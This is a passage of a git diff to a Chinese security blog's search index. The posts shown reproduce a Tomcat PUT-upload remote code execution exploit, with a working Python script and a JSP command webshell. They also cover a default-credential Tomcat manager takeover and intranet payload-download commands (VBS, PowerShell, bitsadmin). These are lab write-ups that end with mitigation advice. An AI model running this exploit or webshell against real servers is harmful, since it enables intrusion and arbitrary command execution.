body&#x3D;body)</span><br><span class="line"></span><br><span class="line">        res &#x3D; conn.getresponse()</span><br><span class="line"></span><br><span class="line">        if res.status  &#x3D;&#x3D; 201 :</span><br><span class="line"></span><br><span class="line">            #print &#39;shell:&#39;, &#39;http:&#x2F;&#x2F;&#39; + sys.argv[1] + url[:-7]</span><br><span class="line"></span><br><span class="line">            print &#39;shell:&#39;, &#39;http:&#x2F;&#x2F;&#39; + sys.argv[1] + url[:-1]</span><br><span class="line"></span><br><span class="line">        elif res.status &#x3D;&#x3D; 204 :</span><br><span class="line"></span><br><span class="line">            print &#39;file exists&#39;</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line"></span><br><span class="line">            print &#39;error&#39;</span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        print &#39;Server not vulnerable&#39;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">except Exception,e:</span><br><span class="line"></span><br><span class="line">    print &#39;Error:&#39;, e</span><br></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\l1395\Desktop&gt;python2 test.py 192.168.220.141:8080</span><br><span class="line">shell: http:&#x2F;&#x2F;192.168.220.141:8080&#x2F;1564383217.jsp</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/21635/5.png" alt="命令执行"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。</p>
+<p>根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险； 注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sql注入之盲注</title>
     <url>/posts/24339.html</url>
     <content><![CDATA[<h2 id="0x00-基于布尔盲注"><a href="#0x00-基于布尔盲注" class="headerlink" title="0x00 基于布尔盲注"></a>0x00 基于布尔盲注</h2><p>截取字符串常用函数：<br>① MID(column_name,start[,length])      //截取字符串的一部分</p>
@@ -2089,6 +2134,32 @@ string substr(string, start, length)
       </categories>
       <tags>
         <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>tomcat复现之弱口令&amp;后台getshell</title>
+    <url>/posts/30841.html</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>漏洞地址： <a href="http://192.168.220.141:8080/manager/html" target="_blank" rel="noopener">http://192.168.220.141:8080/manager/html</a></p>
+<p>输入用户名： tomcat<br>密码： tomcat</p>
+<p>进入后台</p>
+<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><ol>
+<li><p>制作war包</p>
+<p>将木马打包成压缩包文件，修改后缀名为war</p>
+</li>
+<li><p>上传war包</p>
+<p><img src="/posts/30841/1.png" alt="上传war包"></p>
+</li>
+<li><p>输入密码，get shell！！！</p>
+<p><img src="/posts/30841/2.png" alt="get shell"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -2233,77 +2304,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>tomcat复现之远程代码执行漏洞</title>
-    <url>/posts/21635.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（默认关闭），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。</p>
-<h3 id="涉及版本"><a href="#涉及版本" class="headerlink" title="涉及版本"></a>涉及版本</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tomcat 7.0.0 - 7.0.81</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在 Tomcat 安装目录下的配置文件web.xml中，如果有如下代码，则表示Tomcat已开启  PUT 方法</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;init-param&gt;</span><br><span class="line">    &lt;param-name&gt;readonly&lt;&#x2F;param-name&gt;</span><br><span class="line">    &lt;param-value&gt;false&lt;&#x2F;param-value&gt;</span><br><span class="line">&lt;&#x2F;init-param&gt;</span><br></pre></td></tr></table></figure>
-<p>确保readonly参数为true（默认值），即不允许DELETE和PUT操作</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span><br><span class="line">&lt;!--                       commands like PUT and DELETE are               --&gt;</span><br><span class="line">&lt;!--                       rejected?  [true]                              --&gt;</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>上传webshell</p>
-<h3 id="Burpsuite抓包"><a href="#Burpsuite抓包" class="headerlink" title="Burpsuite抓包"></a>Burpsuite抓包</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br></pre></td></tr></table></figure>
-
-<p>将上面的 GET 方法改为 PUT ，后面写要创建的webshell名，下面传入webshell的内容</p>
-<p>有下面几种方法：</p>
-<p><strong>/xxx.jsp/</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;123.jsp&#x2F;  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/21635/1.png" alt="xxx.jsp/"></p>
-<p>这种方法是服务器会把最后的 <code>/</code> 去掉 </p>
-<p><strong>/xxx.jsp%20</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;123.jsp%20  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
-<p>其中 %20 为url编码，实际是指 (空格)</p>
-<p><img src="/posts/21635/2.png" alt="xxx.jsp%20"></p>
-<p><strong>/xxx.jsp::$DATA</strong>(没有实现)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;123.jsp::$DATA  HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.220.141:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko&#x2F;20100101 Firefox&#x2F;66.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 660</span><br><span class="line"></span><br><span class="line">...jsp shell...</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/21635/3.png" alt="::$DATA"></p>
-<p>使用这种方法也可以上传成功，但是却不能被解析，上传的文件名为 123.jsp::$DATA</p>
-<p><strong>执行结果：</strong></p>
-<p><img src="/posts/21635/4.png" alt="命令执行"></p>
-<h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><p>脚本(基于python2)：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! -*- coding:utf-8 -*- </span><br><span class="line"></span><br><span class="line">import httplib</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">body &#x3D; &#39;&#39;&#39;&lt;%@ page language&#x3D;&quot;java&quot; import&#x3D;&quot;java.util.*,java.io.*&quot; pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line &#x3D; new StringBuilder();try &#123;Process pro &#x3D; Runtime.getRuntime().exec(c);BufferedReader buf &#x3D; new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp &#x3D; null;while ((temp &#x3D; buf.readLine()) !&#x3D; null) &#123;line.append(temp</span><br><span class="line"></span><br><span class="line">+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;&#x2F;pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line"></span><br><span class="line">    conn &#x3D; httplib.HTTPConnection(sys.argv[1])</span><br><span class="line"></span><br><span class="line">    conn.request(method&#x3D;&#39;OPTIONS&#39;, url&#x3D;&#39;&#x2F;ffffzz&#39;)</span><br><span class="line"></span><br><span class="line">    headers &#x3D; dict(conn.getresponse().getheaders())</span><br><span class="line"></span><br><span class="line">    if &#39;allow&#39; in headers and headers[&#39;allow&#39;].find(&#39;PUT&#39;) &gt; 0 :</span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">        conn &#x3D; httplib.HTTPConnection(sys.argv[1])</span><br><span class="line"></span><br><span class="line">        url &#x3D; &quot;&#x2F;&quot; + str(int(time.time()))+&#39;.jsp&#x2F;&#39;</span><br><span class="line"></span><br><span class="line">        #url &#x3D; &quot;&#x2F;&quot; + str(int(time.time()))+&#39;.jsp::$DATA&#39;</span><br><span class="line"></span><br><span class="line">        conn.request( method&#x3D;&#39;PUT&#39;, url&#x3D; url, body&#x3D;body)</span><br><span class="line"></span><br><span class="line">        res &#x3D; conn.getresponse()</span><br><span class="line"></span><br><span class="line">        if res.status  &#x3D;&#x3D; 201 :</span><br><span class="line"></span><br><span class="line">            #print &#39;shell:&#39;, &#39;http:&#x2F;&#x2F;&#39; + sys.argv[1] + url[:-7]</span><br><span class="line"></span><br><span class="line">            print &#39;shell:&#39;, &#39;http:&#x2F;&#x2F;&#39; + sys.argv[1] + url[:-1]</span><br><span class="line"></span><br><span class="line">        elif res.status &#x3D;&#x3D; 204 :</span><br><span class="line"></span><br><span class="line">            print &#39;file exists&#39;</span><br><span class="line"></span><br><span class="line">        else:</span><br><span class="line"></span><br><span class="line">            print &#39;error&#39;</span><br><span class="line"></span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        print &#39;Server not vulnerable&#39;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">except Exception,e:</span><br><span class="line"></span><br><span class="line">    print &#39;Error:&#39;, e</span><br></pre></td></tr></table></figure>
-<p>执行结果：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\l1395\Desktop&gt;python2 test.py 192.168.220.141:8080</span><br><span class="line">shell: http:&#x2F;&#x2F;192.168.220.141:8080&#x2F;1564383217.jsp</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/21635/5.png" alt="命令执行"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该漏洞利用的前提条件需要手动开启readOnly功能，以支持上传操作，默认配置的情况下是无法成功利用漏洞，从实际测试来看，漏洞危害性并没有那么高。但是如果用户一旦启用了readOnly功能，黑客可利用漏洞成功入侵。</p>
-<p>根据业务评估配置conf/webxml文件的readOnly值为Ture或注释参数，禁用PUT方法并重启tomcat服务，临时规避安全风险； 注意： 如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>tomcat复现之弱口令&amp;后台getshell</title>
-    <url>/posts/30841.html</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>漏洞地址： <a href="http://192.168.220.141:8080/manager/html" target="_blank" rel="noopener">http://192.168.220.141:8080/manager/html</a></p>
-<p>输入用户名： tomcat<br>密码： tomcat</p>
-<p>进入后台</p>
-<h3 id="get-shell"><a href="#get-shell" class="headerlink" title="get shell"></a>get shell</h3><ol>
-<li><p>制作war包</p>
-<p>将木马打包成压缩包文件，修改后缀名为war</p>
-</li>
-<li><p>上传war包</p>
-<p><img src="/posts/30841/1.png" alt="上传war包"></p>
-</li>
-<li><p>输入密码，get shell！！！</p>
-<p><img src="/posts/30841/2.png" alt="get shell"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>漏洞复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>《渗透测试之信息收集》</title>
     <url>/posts/25470.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近学习渗透测试，先从最基本的开始吧。<br>在进行渗透测试之前，最重要的就是信息收集，我们要尽可能地收集目标的信息，越详细越好。</p>
@@ -2419,34 +2419,6 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
-    <title>内网文件下载传输</title>
-    <url>/posts/31532.html</url>
-    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-FTP"><a href="#0x00-FTP" class="headerlink" title="0x00 FTP"></a>0x00 FTP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 192.168.72.14 21 &gt;&gt; 1.txt         &#x2F;&#x2F;登陆FTP服务器</span><br><span class="line">echo test&gt;&gt;1.txt                              &#x2F;&#x2F;用户名</span><br><span class="line">echo 111111&gt;&gt;1.txt                              &#x2F;&#x2F;密码</span><br><span class="line">echo bin&gt;&gt;1.txt                              &#x2F;&#x2F;开始</span><br><span class="line">echo get fw.sh&gt;&gt;1.txt                      &#x2F;&#x2F;下载程序</span><br><span class="line">echo bye&gt;&gt;1.txt                              &#x2F;&#x2F;关闭FTP服务器</span><br><span class="line">输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：</span><br><span class="line">ftp -s:1.txt                        &#x2F;&#x2F;以1.txt中的内容执行ftp命令</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/31532/1.png" alt></p>
-<h2 id="0x01-VBS脚本文件下载"><a href="#0x01-VBS脚本文件下载" class="headerlink" title="0x01 VBS脚本文件下载"></a>0x01 VBS脚本文件下载</h2><p>test.vbs脚本：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo Set xPost&#x3D;createObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,0  &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Send() &gt;&gt;test.vbs</span><br><span class="line">echo set sGet&#x3D;createObject(&quot;ADODB.Stream&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Mode&#x3D;3 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Type&#x3D;1 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Open() &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Write xPost.ResponseBody &gt;&gt;test.vbs</span><br><span class="line">echo sGet.SaveToFile &quot;c:\file.zip&quot;,2 &gt;&gt;test.vbs</span><br></pre></td></tr></table></figure>
-<p>这样会在当前目录生成test.vbs<br>然后执行：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/31532/2.png" alt></p>
-<h2 id="0x02-Powershel"><a href="#0x02-Powershel" class="headerlink" title="0x02 Powershel"></a>0x02 Powershel</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>
-<p>test.ps1内容：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$d &#x3D; New-Object System.Net.WebClient</span><br><span class="line">$d.DownloadFile(&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,&quot;1.bat&quot;)</span><br></pre></td></tr></table></figure>
-<p><img src="/posts/31532/3.png" alt></p>
-<h2 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h2><p>第一种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
-<p>第二种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
-<p>第三种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
-<p>第四种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer aa http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
-<p>第五种</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;create aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;addfile qianxiao996 http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;resume aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;info aa &#x2F;verbose</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;complete aa</span><br></pre></td></tr></table></figure>]]></content>
-      <tags>
-        <tag>内网渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>变量覆盖</title>
     <url>/posts/31081.html</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>变量覆盖指的是可以用我们自定义的参数值替换程序原有的变量值。</p>
@@ -2532,6 +2504,34 @@ string substr(string, start, length)
       </categories>
       <tags>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网文件下载传输</title>
+    <url>/posts/31532.html</url>
+    <content><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="0x00-FTP"><a href="#0x00-FTP" class="headerlink" title="0x00 FTP"></a>0x00 FTP</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 192.168.72.14 21 &gt;&gt; 1.txt         &#x2F;&#x2F;登陆FTP服务器</span><br><span class="line">echo test&gt;&gt;1.txt                              &#x2F;&#x2F;用户名</span><br><span class="line">echo 111111&gt;&gt;1.txt                              &#x2F;&#x2F;密码</span><br><span class="line">echo bin&gt;&gt;1.txt                              &#x2F;&#x2F;开始</span><br><span class="line">echo get fw.sh&gt;&gt;1.txt                      &#x2F;&#x2F;下载程序</span><br><span class="line">echo bye&gt;&gt;1.txt                              &#x2F;&#x2F;关闭FTP服务器</span><br><span class="line">输入上面命令后，在远程计算机上就会生成一个1.txt文件，执行命名：</span><br><span class="line">ftp -s:1.txt                        &#x2F;&#x2F;以1.txt中的内容执行ftp命令</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/31532/1.png" alt></p>
+<h2 id="0x01-VBS脚本文件下载"><a href="#0x01-VBS脚本文件下载" class="headerlink" title="0x01 VBS脚本文件下载"></a>0x01 VBS脚本文件下载</h2><p>test.vbs脚本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo Set xPost&#x3D;createObject(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Open &quot;GET&quot;,&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,0  &gt;&gt;test.vbs</span><br><span class="line">echo xPost.Send() &gt;&gt;test.vbs</span><br><span class="line">echo set sGet&#x3D;createObject(&quot;ADODB.Stream&quot;) &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Mode&#x3D;3 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Type&#x3D;1 &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Open() &gt;&gt;test.vbs</span><br><span class="line">echo sGet.Write xPost.ResponseBody &gt;&gt;test.vbs</span><br><span class="line">echo sGet.SaveToFile &quot;c:\file.zip&quot;,2 &gt;&gt;test.vbs</span><br></pre></td></tr></table></figure>
+<p>这样会在当前目录生成test.vbs<br>然后执行：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript test.vbs</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/31532/2.png" alt></p>
+<h2 id="0x02-Powershel"><a href="#0x02-Powershel" class="headerlink" title="0x02 Powershel"></a>0x02 Powershel</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass -File .\test.ps1</span><br></pre></td></tr></table></figure>
+<p>test.ps1内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$d &#x3D; New-Object System.Net.WebClient</span><br><span class="line">$d.DownloadFile(&quot;http:&#x2F;&#x2F;192.168.72.14&#x2F;1.bat&quot;,&quot;1.bat&quot;)</span><br></pre></td></tr></table></figure>
+<p><img src="/posts/31532/3.png" alt></p>
+<h2 id="0x03-bitsadmin"><a href="#0x03-bitsadmin" class="headerlink" title="0x03 bitsadmin"></a>0x03 bitsadmin</h2><p>第一种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
+<p>第二种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getfile http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
+<p>第三种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;rawreturn &#x2F;transfer getpayload http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
+<p>第四种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;transfer aa http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br></pre></td></tr></table></figure>
+<p>第五种</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin &#x2F;create aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;addfile qianxiao996 http:&#x2F;&#x2F;192.168.72.13&#x2F;1.bat c:\new\1.bat</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;resume aa</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;info aa &#x2F;verbose</span><br><span class="line"></span><br><span class="line">bitsadmin &#x2F;complete aa</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>内网渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -2670,6 +2670,32 @@ string substr(string, start, length)
       </tags>
   </entry>
   <entry>
+    <title>敏感词替换</title>
+    <url>/posts/31986.html</url>
+    <content><![CDATA[<h2 id="流程以及思路确定"><a href="#流程以及思路确定" class="headerlink" title="流程以及思路确定"></a>流程以及思路确定</h2><p>1.用户输入一串文字 ，保存到user_input中<br>2.检查文字是否有敏感词，以及敏感词的具体位置，直接使用relpace方式替换掉敏感词    <a id="more"></a><br>3.一句话中可能含有多个敏感字，这个时候就要重复2的步骤。<br>4.使用 * *len（str） 替换掉敏感词对应的个数。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># encoding:utf-8   </span><br><span class="line">user_input &#x3D; input(&#39;请输入:&#39;)   </span><br><span class="line">for filter_word in open(&#39;filter.txt&#39;):</span><br><span class="line">    filter &#x3D; filter_word.rstrip()</span><br><span class="line">    if filter in user_input:</span><br><span class="line">        filter_len &#x3D; len(filter)</span><br><span class="line">        user_input &#x3D; user_input.replace(filter,&#39;*&#39;*filter_len)</span><br><span class="line">else:</span><br><span class="line">    print(user_input)</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol>
+<li>python中文件的读取<br>函数open(filename,mode)用于读取文件，返回一个file object。 所以现在我们的filter.txt是一个文件对象<br>参数filename:是一个字符串，用来代表文件名.<br>参数mode:决定了打开文件的方式，比如只读(r)， 写入(w)， 追加等。</li>
+<li>rstrip()方法<br>Python rstrip() 删除 string 字符串末尾的指定字符（默认为空格）.<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str.rstrip([chars])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>chars – 指定删除的字符（默认为空格）</li>
+<li>返回删除 string 字符串末尾的指定字符后生成的新字符串</li>
+</ul>
+</li>
+<li>replace()方法<br>Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。<br>基本格式：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STR.REPLACE(OLD, NEW[, MAX])</span><br></pre></td></tr></table></figure>
+<ul>
+<li>old – 将被替换的子字符串。</li>
+<li>new – 新字符串，用于替换old子字符串。</li>
+<li>max – 可选字符串, 替换不超过 max 次</li>
+<li>返回字符串中的 old（旧字符串） 替换成 new(新字符串)后生成的新字符串，如果指定第三个参数max，则替换不超过 max 次。</li>
+</ul>
+</li>
+<li>for …else…<br>只有当循环里没有遇到 break 时，else 块才会执行。<br>当你想在房间里找某样东西时，只要在任意位置找到了，就停止继续搜查工作。但如果把整个房间都翻遍了，还没找到我们想要的东西，需要告诉人家说：这儿没有你要找的东西。<br>遇到这样的情况用 for … else ，除此之外，最好不要用它</li>
+</ol>
+]]></content>
+  </entry>
